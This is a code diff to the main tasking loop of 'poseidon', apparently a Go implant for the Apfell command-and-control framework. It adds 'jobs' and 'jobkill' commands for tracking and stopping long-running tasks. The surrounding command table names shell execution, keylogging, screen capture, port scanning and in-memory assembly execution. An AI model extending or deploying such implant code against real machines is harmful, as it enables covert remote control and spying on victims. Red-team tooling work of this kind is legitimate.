@@ -27,8 +27,17 @@ import (
 	"github.com/xorrior/poseidon/pkg/utils/functions"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
+import "log"
 
-var assemblyFetched int = 0
+const (
+	NONE_CODE = 30
+	EXIT_CODE = 0
+)
+
+var (
+	assemblyFetched int = 0
+	taskSlice       []structs.Task
+)
 
 //export RunMain
 func RunMain() {
@@ -79,7 +88,7 @@ func main() {
 	profile.SetApfellID(checkIn.ID)
 
 	tasktypes := map[string]int{
-		"exit":             0,
+		"exit":             EXIT_CODE,
 		"shell":            1,
 		"screencapture":    2,
 		"keylog":           3,
@@ -100,7 +109,9 @@ func main() {
 		"portscan":         18,
 		"getprivs":         19,
 		"execute-assembly": 20,
-		"none":             30,
+		"jobs":             21,
+		"jobkill":          22,
+		"none":             NONE_CODE,
 	}
 
 	// Channel used to catch results from tasking threads
@@ -114,9 +125,25 @@ func main() {
 			// Get the next task
 			t := profile.GetTasking()
 			task := t.(structs.Task)
-
+			/*
+				Unfortunately, due to the architecture of goroutines, there is no easy way to kill threads.
+				This check is to make sure we're running a "killable" process, and if so, add it to the queue.
+				The supported processes are:
+					- executeassembly
+					- triagedirectory
+					- portscan
+			*/
+			if tasktypes[task.Command] == 16 || tasktypes[task.Command] == 18 || tasktypes[task.Command] == 20 {
+				job := &structs.Job{
+					KillChannel: make(chan int),
+					Stop:        new(int),
+					Monitoring:  false,
+				}
+				task.Job = job
+				taskSlice = append(taskSlice, task)
+			}
 			switch tasktypes[task.Command] {
-			case 0:
+			case EXIT_CODE:
 				// Throw away the response, we don't really need it for anything
 				profile.PostResponse(task, "Exiting")
 				break LOOP
@@ -279,7 +306,65 @@ func main() {
 				//log.Println("Done")
 				go executeassembly.Run(args, tMsg, res)
 				break
-			case 30:
+			case 21:
+				// Return the list of jobs.
+				tMsg := structs.ThreadMsg{}
+				tMsg.TaskItem = task
+				tMsg.Error = false
+				log.Println("Number of tasks processing:", len(taskSlice))
+				fmt.Println(taskSlice)
+				// For graceful error handling server-side when zero jobs are processing.
+				if len(taskSlice) == 0 {
+					tMsg.TaskResult = []byte("[]")
+				} else {
+					var jobList []structs.TaskStub
+					for _, x := range taskSlice {
+						jobList = append(jobList, x.ToStub())
+					}
+					jsonSlices, err := json.Marshal(jobList)
+					log.Println("Finished marshalling tasks into:", string(jsonSlices))
+					if err != nil {
+						log.Println("Failed to marshal :'(")
+						log.Println(err.Error())
+						tMsg.Error = true
+						tMsg.TaskResult = []byte(err.Error())
+						go func() {
+							res <- tMsg
+						}()
+						break
+					}
+					tMsg.TaskResult = jsonSlices
+				}
+				go func() {
+					res <- tMsg
+				}()
+				log.Println("returned!")
+				break
+			case 22:
+				// Kill the job
+				tMsg := structs.ThreadMsg{}
+				tMsg.Error = false
+				tMsg.TaskItem = task
+
+				foundTask := false
+				for _, taskItem := range taskSlice {
+					if taskItem.ID == task.Params {
+						go taskItem.Job.SendKill()
+						foundTask = true
+					}
+				}
+
+				if foundTask {
+					tMsg.TaskResult = []byte(fmt.Sprintf("Sent kill signal to Job ID: %s", task.Params))
+				} else {
+					tMsg.TaskResult = []byte(fmt.Sprintf("No job with ID: %s", task.Params))
+					tMsg.Error = true
+				}
+				go func(threadChan *chan structs.ThreadMsg, msg *structs.ThreadMsg) {
+					*threadChan <- *msg
+				}(&res, &tMsg)
+				break
+			case NONE_CODE:
 				// No tasks, do nothing
 				break
 			}
@@ -287,6 +372,16 @@ func main() {
 			// Listen on the results channel for 1 second
 			select {
 			case toApfell := <-res:
+				for i := 0; i < len(taskSlice); i++ {
+					if taskSlice[i].ID == toApfell.TaskItem.ID {
+						if i != (len(taskSlice) - 1) {
+							taskSlice = append(taskSlice[:i], taskSlice[i+1:]...)
+						} else {
+							taskSlice = taskSlice[:i]
+						}
+						break
+					}
+				}
 				if strings.Contains(toApfell.TaskItem.Command, "screencapture") {
 					profile.SendFileChunks(toApfell.TaskItem, toApfell.TaskResult)
 				} else {
